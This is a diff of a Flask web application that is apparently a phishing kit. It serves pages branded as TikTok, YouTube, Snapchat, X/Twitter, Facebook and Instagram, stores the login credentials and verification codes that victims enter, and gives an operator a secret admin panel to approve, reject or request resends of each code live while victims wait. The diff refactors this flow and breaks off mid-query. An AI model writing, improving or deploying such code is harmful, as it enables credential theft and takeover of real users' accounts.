@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for, send_file, flash, jsonify, session
+from flask import Flask, render_template, request, redirect, url_for, send_file, flash, jsonify
 import sqlite3, os, csv
 from datetime import datetime
 
@@ -60,39 +60,35 @@ def init_db():
                 confirmed BOOLEAN DEFAULT 0,
                 platform_name TEXT,
                 rejected BOOLEAN DEFAULT 0,
-                resend_requested BOOLEAN DEFAULT 0,
-                previous_page TEXT,
-                current_status TEXT DEFAULT 'pending'
+                resend_requested BOOLEAN DEFAULT 0
             )
         ''')
         conn.commit()
 
 init_db()
 
-def save_submission(page, user, data, code_value=None, platform_name=None, previous_page=None):
+def save_submission(page, user, data, code_value=None, platform_name=None):
     icon, color, name = ICON_MAP.get(page, ("fa-solid fa-file", "#333", "Unknown"))
     with sqlite3.connect(DB_FILE) as conn:
-        cursor = conn.execute('''
-            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested, previous_page)
-            VALUES (?,?,?,?,?,?,?,?,?,?,?)
-        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0, previous_page))
+        conn.execute('''
+            INSERT INTO submissions (timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested)
+            VALUES (?,?,?,?,?,?,?,?,?,?)
+        ''', (datetime.utcnow().isoformat(), page, user, data, icon, code_value, 0, platform_name, 0, 0))
         conn.commit()
-        return cursor.lastrowid
 
-def check_confirmation(submission_id):
+def check_confirmation(code_value):
     with sqlite3.connect(DB_FILE) as conn:
         result = conn.execute(
-            'SELECT confirmed, rejected, resend_requested, current_status FROM submissions WHERE id = ?',
-            (submission_id,)
+            'SELECT confirmed, rejected, resend_requested FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+            (code_value,)
         ).fetchone()
         if result:
             return {
                 'confirmed': bool(result[0]),
                 'rejected': bool(result[1]),
-                'resend_requested': bool(result[2]),
-                'status': result[3] or 'pending'
+                'resend_requested': bool(result[2])
             }
-        return {'confirmed': False, 'rejected': False, 'resend_requested': False, 'status': 'not_found'}
+        return {'confirmed': False, 'rejected': False, 'resend_requested': False}
 
 def extract_user(form):
     for key in ("address","email","phone","fullname","street","username"):
@@ -105,53 +101,9 @@ def extract_user(form):
 def get_platform_icon(platform_name):
     return PLATFORM_ICON_MAP.get(platform_name, PLATFORM_ICON_MAP["Unknown"])
 
-# Helper function to get previous page URL based on platform and current page
-def get_previous_page_url(platform, current_page):
-    platform_pages = {
-        'TikTok': {
-            'joy1_2': '/joy1_2',
-            'joy1_3': '/joy1_2'
-        },
-        'YouTube': {
-            'joy2_2': '/joy2_2',
-            'joy2_3': '/joy2_2'
-        },
-        'Snapchat': {
-            'happy1_2': '/happy1_2',
-            'happy1_3': '/happy1_2'
-        },
-        'X / Twitter': {
-            'happy2_2': '/happy2_2',
-            'happy2_3': '/happy2_2'
-        },
-        'Facebook': {
-            'love1_2': '/love1_2',
-            'love1_3': '/love1_2'
-        },
-        'Instagram': {
-            'love2_2': '/love2_2',
-            'love2_3': '/love2_2'
-        }
-    }
-    
-    # For common flow pages
-    common_pages = {
-        'f1_A': '/f1_A',
-        'f2_A': '/f2_A'
-    }
-    
-    if platform in platform_pages and current_page in platform_pages[platform]:
-        return platform_pages[platform][current_page]
-    elif current_page in common_pages:
-        return common_pages[current_page]
-    else:
-        return '/'
-
 @app.route('/')
 def index():
     return render_template('index.html')
-
-# ========== INDIVIDUAL ROUTES (FIXED) ==========
 
 # TikTok Flow
 @app.route('/joy1_1', methods=['GET','POST'])
@@ -162,56 +114,51 @@ def joy1_1():
         pwd = request.form.get('password','')
         save_submission('joy1_1', user, f'address={addr}; password={pwd}', platform_name="TikTok")
         return redirect(url_for('joy1_2'))
-    platform_icon, platform_color = get_platform_icon('TikTok')
-    return render_template('joy1_1.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)
+    return render_template('joy1_1.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')
 
 @app.route('/joy1_2', methods=['GET','POST'])
 def joy1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'joy1_2', user, f'digits={digits}', 
-            code_value=digits, platform_name="TikTok",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('TikTok')
-        previous_page_url = get_previous_page_url('TikTok', 'joy1_2')
-        
+        save_submission('joy1_2', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('joy1_3'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='TikTok',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('TikTok')
-    return render_template('joy1_2.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)
+                             platform_icon='fa-brands fa-tiktok', 
+                             platform_name='TikTok', 
+                             platform_color='#000000')
+    return render_template('joy1_2.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')
 
 @app.route('/joy1_3', methods=['GET','POST'])
 def joy1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'joy1_3', user, f'digits={digits}', 
-            code_value=digits, platform_name="TikTok",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('TikTok')
-        previous_page_url = get_previous_page_url('TikTok', 'joy1_3')
-        
+        save_submission('joy1_3', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='TikTok'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='TikTok',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('TikTok')
-    return render_template('joy1_3.html', platform_icon=platform_icon, platform_name='TikTok', platform_color=platform_color)
+                             platform_icon='fa-brands fa-tiktok', 
+                             platform_name='TikTok', 
+                             platform_color='#000000')
+    return render_template('joy1_3.html', platform_icon='fa-brands fa-tiktok', platform_name='TikTok', platform_color='#000000')
 
 # YouTube Flow
 @app.route('/joy2_1', methods=['GET','POST'])
@@ -222,56 +169,51 @@ def joy2_1():
         pwd = request.form.get('password','')
         save_submission('joy2_1', user, f'address={addr}; password={pwd}', platform_name="YouTube")
         return redirect(url_for('joy2_2'))
-    platform_icon, platform_color = get_platform_icon('YouTube')
-    return render_template('joy2_1.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)
+    return render_template('joy2_1.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')
 
 @app.route('/joy2_2', methods=['GET','POST'])
 def joy2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'joy2_2', user, f'digits={digits}', 
-            code_value=digits, platform_name="YouTube",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('YouTube')
-        previous_page_url = get_previous_page_url('YouTube', 'joy2_2')
-        
+        save_submission('joy2_2', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('joy2_3'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='YouTube',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('YouTube')
-    return render_template('joy2_2.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)
+                             platform_icon='fa-brands fa-youtube', 
+                             platform_name='YouTube', 
+                             platform_color='#FF0000')
+    return render_template('joy2_2.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')
 
 @app.route('/joy2_3', methods=['GET','POST'])
 def joy2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'joy2_3', user, f'digits={digits}', 
-            code_value=digits, platform_name="YouTube",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('YouTube')
-        previous_page_url = get_previous_page_url('YouTube', 'joy2_3')
-        
+        save_submission('joy2_3', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='YouTube'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='YouTube',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('YouTube')
-    return render_template('joy2_3.html', platform_icon=platform_icon, platform_name='YouTube', platform_color=platform_color)
+                             platform_icon='fa-brands fa-youtube', 
+                             platform_name='YouTube', 
+                             platform_color='#FF0000')
+    return render_template('joy2_3.html', platform_icon='fa-brands fa-youtube', platform_name='YouTube', platform_color='#FF0000')
 
 # Snapchat Flow
 @app.route('/happy1_1', methods=['GET','POST'])
@@ -282,56 +224,51 @@ def happy1_1():
         pwd = request.form.get('password','')
         save_submission('happy1_1', user, f'address={addr}; password={pwd}', platform_name="Snapchat")
         return redirect(url_for('happy1_2'))
-    platform_icon, platform_color = get_platform_icon('Snapchat')
-    return render_template('happy1_1.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)
+    return render_template('happy1_1.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')
 
 @app.route('/happy1_2', methods=['GET','POST'])
 def happy1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'happy1_2', user, f'digits={digits}', 
-            code_value=digits, platform_name="Snapchat",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('Snapchat')
-        previous_page_url = get_previous_page_url('Snapchat', 'happy1_2')
-        
+        save_submission('happy1_2', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('happy1_3'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='Snapchat',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('Snapchat')
-    return render_template('happy1_2.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)
+                             platform_icon='fa-brands fa-snapchat', 
+                             platform_name='Snapchat', 
+                             platform_color='#FFFC00')
+    return render_template('happy1_2.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')
 
 @app.route('/happy1_3', methods=['GET','POST'])
 def happy1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'happy1_3', user, f'digits={digits}', 
-            code_value=digits, platform_name="Snapchat",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('Snapchat')
-        previous_page_url = get_previous_page_url('Snapchat', 'happy1_3')
-        
+        save_submission('happy1_3', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='Snapchat'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='Snapchat',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('Snapchat')
-    return render_template('happy1_3.html', platform_icon=platform_icon, platform_name='Snapchat', platform_color=platform_color)
+                             platform_icon='fa-brands fa-snapchat', 
+                             platform_name='Snapchat', 
+                             platform_color='#FFFC00')
+    return render_template('happy1_3.html', platform_icon='fa-brands fa-snapchat', platform_name='Snapchat', platform_color='#FFFC00')
 
 # X/Twitter Flow
 @app.route('/happy2_1', methods=['GET','POST'])
@@ -342,56 +279,51 @@ def happy2_1():
         pwd = request.form.get('password','')
         save_submission('happy2_1', user, f'address={addr}; password={pwd}', platform_name="X / Twitter")
         return redirect(url_for('happy2_2'))
-    platform_icon, platform_color = get_platform_icon('X / Twitter')
-    return render_template('happy2_1.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)
+    return render_template('happy2_1.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')
 
 @app.route('/happy2_2', methods=['GET','POST'])
 def happy2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'happy2_2', user, f'digits={digits}', 
-            code_value=digits, platform_name="X / Twitter",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('X / Twitter')
-        previous_page_url = get_previous_page_url('X / Twitter', 'happy2_2')
-        
+        save_submission('happy2_2', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('happy2_3'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='X / Twitter',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('X / Twitter')
-    return render_template('happy2_2.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)
+                             platform_icon='fa-brands fa-x-twitter', 
+                             platform_name='X / Twitter', 
+                             platform_color='#000000')
+    return render_template('happy2_2.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')
 
 @app.route('/happy2_3', methods=['GET','POST'])
 def happy2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'happy2_3', user, f'digits={digits}', 
-            code_value=digits, platform_name="X / Twitter",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('X / Twitter')
-        previous_page_url = get_previous_page_url('X / Twitter', 'happy2_3')
-        
+        save_submission('happy2_3', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='X / Twitter'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='X / Twitter',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('X / Twitter')
-    return render_template('happy2_3.html', platform_icon=platform_icon, platform_name='X / Twitter', platform_color=platform_color)
+                             platform_icon='fa-brands fa-x-twitter', 
+                             platform_name='X / Twitter', 
+                             platform_color='#000000')
+    return render_template('happy2_3.html', platform_icon='fa-brands fa-x-twitter', platform_name='X / Twitter', platform_color='#000000')
 
 # Facebook Flow
 @app.route('/love1_1', methods=['GET','POST'])
@@ -402,56 +334,51 @@ def love1_1():
         pwd = request.form.get('password','')
         save_submission('love1_1', user, f'address={addr}; password={pwd}', platform_name="Facebook")
         return redirect(url_for('love1_2'))
-    platform_icon, platform_color = get_platform_icon('Facebook')
-    return render_template('love1_1.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)
+    return render_template('love1_1.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')
 
 @app.route('/love1_2', methods=['GET','POST'])
 def love1_2():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'love1_2', user, f'digits={digits}', 
-            code_value=digits, platform_name="Facebook",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('Facebook')
-        previous_page_url = get_previous_page_url('Facebook', 'love1_2')
-        
+        save_submission('love1_2', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('love1_3'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='Facebook',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('Facebook')
-    return render_template('love1_2.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)
+                             platform_icon='fa-brands fa-facebook-f', 
+                             platform_name='Facebook', 
+                             platform_color='#1877F2')
+    return render_template('love1_2.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')
 
 @app.route('/love1_3', methods=['GET','POST'])
 def love1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'love1_3', user, f'digits={digits}', 
-            code_value=digits, platform_name="Facebook",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('Facebook')
-        previous_page_url = get_previous_page_url('Facebook', 'love1_3')
-        
+        save_submission('love1_3', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='Facebook'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='Facebook',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('Facebook')
-    return render_template('love1_3.html', platform_icon=platform_icon, platform_name='Facebook', platform_color=platform_color)
+                             platform_icon='fa-brands fa-facebook-f', 
+                             platform_name='Facebook', 
+                             platform_color='#1877F2')
+    return render_template('love1_3.html', platform_icon='fa-brands fa-facebook-f', platform_name='Facebook', platform_color='#1877F2')
 
 # Instagram Flow
 @app.route('/love2_1', methods=['GET','POST'])
@@ -462,58 +389,53 @@ def love2_1():
         pwd = request.form.get('password','')
         save_submission('love2_1', user, f'address={addr}; password={pwd}', platform_name="Instagram")
         return redirect(url_for('love2_2'))
-    platform_icon, platform_color = get_platform_icon('Instagram')
-    return render_template('love2_1.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)
+    return render_template('love2_1.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')
 
 @app.route('/love2_2', methods=['GET','POST'])
 def love2_2():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'love2_2', user, f'digits={digits}', 
-            code_value=digits, platform_name="Instagram",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('Instagram')
-        previous_page_url = get_previous_page_url('Instagram', 'love2_2')
-        
+        save_submission('love2_2', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('love2_3'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='Instagram',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('Instagram')
-    return render_template('love2_2.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)
+                             platform_icon='fa-brands fa-instagram', 
+                             platform_name='Instagram', 
+                             platform_color='#E4405F')
+    return render_template('love2_2.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')
 
 @app.route('/love2_3', methods=['GET','POST'])
 def love2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
         digits = request.form.get('digits','')
-        submission_id = save_submission(
-            'love2_3', user, f'digits={digits}', 
-            code_value=digits, platform_name="Instagram",
-            previous_page=request.url
-        )
-        platform_icon, platform_color = get_platform_icon('Instagram')
-        previous_page_url = get_previous_page_url('Instagram', 'love2_3')
-        
+        save_submission('love2_3', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner', platform='Instagram'),
                              code_value=digits,
                              submission_id=submission_id,
-                             platform_icon=platform_icon, 
-                             platform_name='Instagram',
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
-    platform_icon, platform_color = get_platform_icon('Instagram')
-    return render_template('love2_3.html', platform_icon=platform_icon, platform_name='Instagram', platform_color=platform_color)
+                             platform_icon='fa-brands fa-instagram', 
+                             platform_name='Instagram', 
+                             platform_color='#E4405F')
+    return render_template('love2_3.html', platform_icon='fa-brands fa-instagram', platform_name='Instagram', platform_color='#E4405F')
 
-# Common Flow Pages
+# Common Flow Pages - FIXED ROUTES
 @app.route('/spinner')
 def spinner():
     platform = request.args.get('platform', 'Unknown')
@@ -526,11 +448,13 @@ def spinner():
                          platform_name=platform,
                          platform_color=platform_color)
 
+# FIXED: f1 route - get platform from form data for POST requests
 @app.route('/f1', methods=['GET','POST'])
 def f1():
     if request.method == 'POST':
         user = extract_user(request.form)
         items = [f"{k}: {v}" for k,v in request.form.items()]
+        # Get platform from form data (hidden input) or fallback to URL parameter
         platform = request.form.get('platform', request.args.get('platform', 'Unknown'))
         save_submission('f1', user, " ; ".join(items), platform_name=platform)
         return redirect(url_for('f1_A', platform=platform))
@@ -544,22 +468,22 @@ def f1_A():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         platform = request.args.get('platform', 'Unknown')
-        submission_id = save_submission(
-            'f1_A', user, f'digits={digits}', 
-            code_value=digits, platform_name=platform,
-            previous_page=request.url
-        )
+        save_submission('f1_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         platform_icon, platform_color = get_platform_icon(platform)
-        previous_page_url = get_previous_page_url(platform, 'f1_A')
-        
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('spinner2', platform=platform),
                              code_value=digits,
                              submission_id=submission_id,
                              platform_icon=platform_icon, 
                              platform_name=platform,
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
+                             platform_color=platform_color)
     platform = request.args.get('platform', 'Unknown')
     platform_icon, platform_color = get_platform_icon(platform)
     return render_template('f1_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
@@ -594,22 +518,22 @@ def f2_A():
         user = extract_user(request.form)
         digits = request.form.get('digits','')
         platform = request.args.get('platform', 'Unknown')
-        submission_id = save_submission(
-            'f2_A', user, f'digits={digits}', 
-            code_value=digits, platform_name=platform,
-            previous_page=request.url
-        )
+        save_submission('f2_A', user, f'digits={digits}', code_value=digits, platform_name=platform)
+        # Get the latest submission ID for this code
+        with sqlite3.connect(DB_FILE) as conn:
+            submission = conn.execute(
+                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
+                (digits,)
+            ).fetchone()
+        submission_id = submission[0] if submission else None
         platform_icon, platform_color = get_platform_icon(platform)
-        previous_page_url = get_previous_page_url(platform, 'f2_A')
-        
         return render_template('waiting_confirmation.html', 
                              next_url=url_for('m1', platform=platform),
                              code_value=digits,
                              submission_id=submission_id,
                              platform_icon=platform_icon, 
                              platform_name=platform,
-                             platform_color=platform_color,
-                             previous_page_url=previous_page_url)
+                             platform_color=platform_color)
     platform = request.args.get('platform', 'Unknown')
     platform_icon, platform_color = get_platform_icon(platform)
     return render_template('f2_A.html', platform_icon=platform_icon, platform_name=platform, platform_color=platform_color)
@@ -625,122 +549,100 @@ def m1():
 
 # ========== ENHANCED CONFIRMATION & REJECTION SYSTEM ==========
 
-@app.route('/api/check_confirmation/<int:submission_id>')
-def api_check_confirmation(submission_id):
-    """Enhanced confirmation check with proper status handling"""
-    status = check_confirmation(submission_id)
+@app.route('/api/check_confirmation/<code_value>')
+def api_check_confirmation(code_value):
+    status = check_confirmation(code_value)
     return jsonify(status)
 
 @app.route(f"/admin/{ADMIN_SECRET}/confirm/<int:submission_id>", methods=['POST'])
 def admin_confirm(submission_id):
     with sqlite3.connect(DB_FILE) as conn:
-        conn.execute(
-            'UPDATE submissions SET confirmed = 1, rejected = 0, current_status = "approved" WHERE id = ?', 
-            (submission_id,)
-        )
+        conn.execute('UPDATE submissions SET confirmed = 1, rejected = 0 WHERE id = ?', (submission_id,))
         conn.commit()
     return jsonify({'success': True})
 
+# NEW: Reject submission endpoint
 @app.route(f"/admin/{ADMIN_SECRET}/reject/<int:submission_id>", methods=['POST'])
 def admin_reject(submission_id):
     with sqlite3.connect(DB_FILE) as conn:
-        # Get submission details for redirect
-        submission = conn.execute(
-            'SELECT platform_name, page FROM submissions WHERE id = ?', (submission_id,)
-        ).fetchone()
-        
-        conn.execute(
-            'UPDATE submissions SET rejected = 1, confirmed = 0, current_status = "rejected" WHERE id = ?', 
-            (submission_id,)
-        )
+        conn.execute('UPDATE submissions SET rejected = 1, confirmed = 0 WHERE id = ?', (submission_id,))
         conn.commit()
-    
     return jsonify({'success': True})
 
+# NEW: Request new code endpoint
 @app.route('/api/request_new_code/<int:submission_id>', methods=['POST'])
 def api_request_new_code(submission_id):
-    """Enhanced new code request with proper redirect logic"""
     with sqlite3.connect(DB_FILE) as conn:
         # Mark that user requested a new code
-        conn.execute(
-            'UPDATE submissions SET resend_requested = 1, current_status = "resend_requested" WHERE id = ?', 
-            (submission_id,)
-        )
+        conn.execute('UPDATE submissions SET resend_requested = 1 WHERE id = ?', (submission_id,))
         
-        # Get submission details for proper redirect
+        # Get platform info for redirect
         submission = conn.execute(
-            'SELECT platform_name, page, previous_page FROM submissions WHERE id = ?', (submission_id,)
+            'SELECT platform_name FROM submissions WHERE id = ?', (submission_id,)
         ).fetchone()
         
         conn.commit()
     
     if submission:
         platform = submission[0] or 'Unknown'
-        current_page = submission[1] or ''
-        stored_previous_page = submission[2] or ''
-        
-        # Use stored previous page if available, otherwise calculate it
-        if stored_previous_page:
-            redirect_url = stored_previous_page
-        else:
-            redirect_url = get_previous_page_url(platform, current_page)
-        
-        return jsonify({
-            'success': True, 
-            'redirect_url': redirect_url,
-            'message': 'New code requested successfully'
-        })
+        # Determine which page to redirect back to based on platform
+        redirect_url = get_previous_code_page(platform)
+        return jsonify({'success': True, 'redirect_url': redirect_url})
     
     return jsonify({'success': False, 'error': 'Submission not found'})
 
-# UPDATED: Admin route with enhanced statistics
+def get_previous_code_page(platform):
+    """Determine which page to send user back to based on platform"""
+    platform_pages = {
+        'TikTok': '/joy1_2',
+        'YouTube': '/joy2_2', 
+        'Snapchat': '/happy1_2',
+        'X / Twitter': '/happy2_2',
+        'Facebook': '/love1_2',
+        'Instagram': '/love2_2'
+    }
+    return platform_pages.get(platform, '/')
+
+# UPDATED: Admin route with statistics calculation
 @app.route(f"/admin/{ADMIN_SECRET}")
 def admin():
     with sqlite3.connect(DB_FILE) as conn:
         rows = conn.execute(
-            'SELECT id, timestamp, page, user, data, icon, code_value, confirmed, platform_name, rejected, resend_requested, previous_page, current_status FROM submissions ORDER BY id DESC'
